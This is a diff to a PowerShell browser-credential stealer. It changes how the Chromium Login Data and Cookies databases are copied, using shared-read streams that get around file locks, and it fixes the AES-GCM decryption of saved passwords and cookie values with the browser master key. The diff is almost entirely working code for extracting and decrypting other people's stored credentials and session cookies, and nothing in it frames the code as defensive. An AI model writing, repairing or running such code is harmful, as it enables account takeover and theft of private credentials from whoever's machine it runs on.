@@ -636,7 +636,11 @@ function Get-ChromiumLoginBlobs {
     $TempDatabasePath           = Join-Path $env:TEMP ("$($Browser)_LoginData_{0}.db" -f ([guid]::NewGuid()))
 
     try {
-        Copy-Item -LiteralPath $LoginDataPath -Destination $TempDatabasePath -Force -ErrorAction Stop
+        $InStream = [System.IO.File]::Open($LoginDataPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        $OutStream = [System.IO.File]::Open($TempDatabasePath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
+        $InStream.CopyTo($OutStream)
+        $OutStream.Close()
+        $InStream.Close()
     }
     catch {
         return "[-] Unable to copy database file from $LoginDataPath"
@@ -743,7 +747,13 @@ function Get-ChromiumCookieBlobs {
     [int]$SqliteOpenReadOnly = 1
     $TempDatabasePath = Join-Path $env:TEMP ("$($Browser)_Cookies_{0}.db" -f ([guid]::NewGuid()))
 
-    Copy-Item -LiteralPath $CookiePath -Destination $TempDatabasePath -Force -ErrorAction SilentlyContinue
+    try {
+        $InStream = [System.IO.File]::Open($CookiePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        $OutStream = [System.IO.File]::Open($TempDatabasePath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
+        $InStream.CopyTo($OutStream)
+        $OutStream.Close()
+        $InStream.Close()
+    } catch { return $false }
 
     $DatabasePointer = [IntPtr]::Zero
     $StatementPointer = [IntPtr]::Zero
@@ -881,19 +891,19 @@ if (-not ($Browser)){
     }
 
 # ------------------------------------------------------------------
-    # 4. DECRYPT EVERYTHING (Direct Logic)
+    # 4. DECRYPT EVERYTHING 
     # ------------------------------------------------------------------
     $DecryptedLogins = @()
     foreach ($Entry in $BrowserData) {
         try {
             $RawData = [Convert]::FromBase64String($Entry.Base64EncryptedPassword)
-            # Chromium format: v10 (3 bytes) + Nonce (12 bytes) + Ciphertext + Tag (16 bytes)
             $Nonce = $RawData[3..14]
-            $Tag = $RawData[($RawData.Length - 16)..($RawData.Length - 1)]
             $Ciphertext = $RawData[15..($RawData.Length - 17)]
+            $Tag = $RawData[($RawData.Length - 16)..($RawData.Length - 1)]
             
-            # Using the Decrypt-AESGCM function already present in your script
-            $Pass = Decrypt-AESGCM -Key $MasterKey -Nonce $Nonce -Ciphertext $Ciphertext -Tag $Tag
+            # Using the correct function name: DecryptWithAesGcm
+            $PassBytes = DecryptWithAesGcm -Key $MasterKey -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
+            $Pass = [Text.Encoding]::UTF8.GetString($PassBytes)
             $DecryptedLogins += [PSCustomObject]@{ URL = $Entry.URL; User = $Entry.Username; Pass = $Pass }
         } catch { 
             $DecryptedLogins += [PSCustomObject]@{ URL = $Entry.URL; User = $Entry.Username; Pass = "(Decryption Failed)" }
@@ -905,10 +915,12 @@ if (-not ($Browser)){
         try {
             $RawData = [Convert]::FromBase64String($C.Base64EncryptedValue)
             $Nonce = $RawData[3..14]
-            $Tag = $RawData[($RawData.Length - 16)..($RawData.Length - 1)]
             $Ciphertext = $RawData[15..($RawData.Length - 17)]
+            $Tag = $RawData[($RawData.Length - 16)..($RawData.Length - 1)]
             
-            $Val = Decrypt-AESGCM -Key $MasterKey -Nonce $Nonce -Ciphertext $Ciphertext -Tag $Tag
+            # Using the correct function name: DecryptWithAesGcm
+            $ValBytes = DecryptWithAesGcm -Key $MasterKey -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
+            $Val = [Text.Encoding]::UTF8.GetString($ValBytes)
             $DecryptedCookies += [PSCustomObject]@{ Host = $C.Host; Name = $C.Name; Value = $Val }
         } catch {
             $DecryptedCookies += [PSCustomObject]@{ Host = $C.Host; Name = $C.Name; Value = "(Decryption Failed)" }
